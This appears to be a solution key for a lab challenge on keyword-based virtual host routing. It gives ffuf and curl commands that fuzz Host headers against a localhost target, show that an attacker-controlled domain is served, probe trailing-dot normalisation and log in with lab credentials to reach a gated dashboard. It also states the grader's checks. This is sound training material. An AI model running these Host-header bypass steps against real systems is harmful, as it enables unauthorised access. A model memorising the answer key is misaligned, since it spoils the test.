# Solution — C10 (keyword vhost)

```bash
U=https://127.0.0.1:18533

# 1. find it: whole-value Host fuzzing, not subdomain enumeration
ffuf -u $U/ -H 'Host: FUZZ' -w _shared/data/host-keywords.txt -ac -t 40

# 2. confirm the shape family
for h in portal portalstg.app.test app.portal.test PORTAL portal:443; do
  printf '%-22s ' "$h"; curl -sk -o /dev/null -w '%{http_code} ' -H "Host: $h" $U/; 
  curl -sk -H "Host: $h" $U/ | shasum -a1 | cut -c1-8
done

# 3. the reportable bit: no domain allowlist
curl -sk -H 'Host: portal.attacker.test' $U/ | grep -o '<h1>Portal</h1>'

# 4. the normalisation gap
curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal.' $U/          # 404 (suffix rule wins)

# 5. state change, not a 200
TOK=$(curl -sk -H 'Host: portal' -H 'Content-Type: application/json' \
  -d '{"email":"alex@corp.lab","password":"agent-pass-2026"}' $U/api/auth/login | jq -r .token)
curl -sk -H 'Host: portal' -H "Authorization: Bearer $TOK" $U/dashboard | jq .
```

Why this case exists (your pattern): front ends built on ARR/IIS ServerName rules, nginx
`server_name` wildcards, App Service default domains, or Envoy `:authority` regexes end up routing on
*part of* the name. Consequences worth knowing:

- The app is invisible to DNS, to `crt.sh`, and to `Host: name.<base>` fuzzing. You must vary the
  whole value, including single-label hosts.
- Because the rule is a substring, **any domain** containing the word reaches it. If that front end is
  reachable at all, an attacker who controls DNS can serve the app under their own name — that is the
  difference between "interesting vhost" and "reportable".
- Normalisation is the other half: case, port, trailing dot. `portal` and `portal.` behaving
  differently means the rule stack has two layers, and your bypass may live in the gap.

Grading: the check asserts every documented shape reaches the same bytes, the attacker domain is
served, the trailing dot is not, exact rules beat keyword rules, `vpn` stays a 403 bait, HTTP/1.0
without Host hits the wall, the dashboard is gated, and the sweep flags the keyword family plus the
bait — nothing else.
